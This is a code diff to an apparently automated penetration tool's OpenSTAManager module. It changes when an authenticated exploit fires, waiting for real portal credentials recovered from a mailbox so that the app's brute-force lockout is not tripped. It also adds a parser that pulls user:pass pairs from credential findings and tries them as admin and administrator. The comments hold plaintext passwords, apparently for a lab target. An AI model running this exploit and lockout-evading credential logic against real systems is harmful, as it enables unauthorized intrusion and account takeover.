@@ -76,13 +76,23 @@ def run(host: HostReport, opts) -> None:
         if not (getattr(opts, "exploit", False) and (_vulnerable(version)
                                                       or version == "unknown")):
             continue
-        # Only (re)run when the available logins changed since the last attempt,
+        # Wait for a REAL portal credential before touching the login. OpenSTAManager
+        # has an aggressive brute-lock; spraying reuse guesses (admin:Enigma2024!…)
+        # that can never work only locks the app before the actual portal cred
+        # (admin:Ne3s4rtars78s, recovered later from a mailbox) is even known.
+        explicit = _explicit_portal_logins(host)
+        if not explicit:
+            utils.log("dim", "OpenSTAManager: holding exploit until a real portal "
+                             "credential is recovered (avoids brute-locking the "
+                             "app with reuse guesses)", indent=1)
+            continue
+        # Only (re)run when the explicit logins changed since the last attempt,
         # so convergence re-invocations don't repeat identical, failed work.
-        logins = frozenset(_portal_logins(host))
-        if not logins or tried.get(key) == logins:
+        logins = frozenset(explicit)
+        if tried.get(key) == logins:
             continue
         tried[key] = logins
-        if _exploit(host, base, hoststr, version):
+        if _exploit(host, base, hoststr, version, explicit):
             pwned.add(key)
 
 
@@ -222,17 +232,14 @@ def _playbook(base: str, version: str, logins: List[str]) -> str:
 # active exploitation (--exploit): authenticated error-based extraction only.
 # Never fires the time-based DoS CVE.
 # --------------------------------------------------------------------------
-def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
-    logins = _portal_logins(host)
+def _exploit(host: HostReport, base: str, vhost: str, version: str,
+             logins: List[str]) -> bool:
     if not logins:
-        utils.log("dim", "no portal login in hand yet — the OpenSTAManager RCE is "
-                         "authenticated (recover the support-portal creds first)",
-                  indent=1)
         return False
 
-    utils.log("info", f"trying {min(len(logins), 8)} portal login(s): "
-                      + ", ".join(logins[:8]), indent=1)
-    for login in logins[:8]:
+    utils.log("info", f"trying {len(logins)} portal login(s): "
+                      + ", ".join(logins), indent=1)
+    for login in logins:
         user, _, pw = login.partition(":")
         user = user.split("@", 1)[0]
         if not pw:
@@ -709,6 +716,37 @@ def _harvest(host: HostReport, out: str, base: str) -> None:
 
 
 # --------------------------------------------------------------------------
+def _explicit_portal_logins(host: HostReport) -> List[str]:
+    """user:pass pairs from a REAL portal-credential finding (a provisioning
+    email: 'Portal credential …'), plus admin/administrator with those same
+    passwords in case the username differs. NO reuse-spray cartesian — that only
+    trips OpenSTAManager's brute-lock before the right cred is even known."""
+    out, seen, pws = [], set(), set()
+
+    def add(u, p):
+        k = f"{u.lower()}:{p}"
+        if u and p and k not in seen:
+            seen.add(k)
+            out.append(f"{u}:{p}")
+
+    for f in host.findings:
+        if f.category != "cred":
+            continue
+        t = f.title.lower()
+        if "portal" not in t and "openstamanager" not in t:
+            continue
+        for src in (f.evidence or "", f.detail or ""):
+            clean = re.sub(r"\b[a-z][a-z0-9+.-]*://\S+", " ", src, flags=re.I)
+            for m in re.findall(r"\b([A-Za-z][A-Za-z0-9._%+-]{1,39}):"
+                                r"([^\s,;'\"/]{3,40})", clean):
+                add(m[0], m[1])
+                pws.add(m[1])
+    for p in pws:
+        add("admin", p)
+        add("administrator", p)
+    return out[:6]
+
+
 def _portal_logins(host: HostReport) -> List[str]:
     """user:pass pairs to try. Explicit pairs from findings/mail first, then the
     Cartesian of recovered passwords x candidate usernames."""
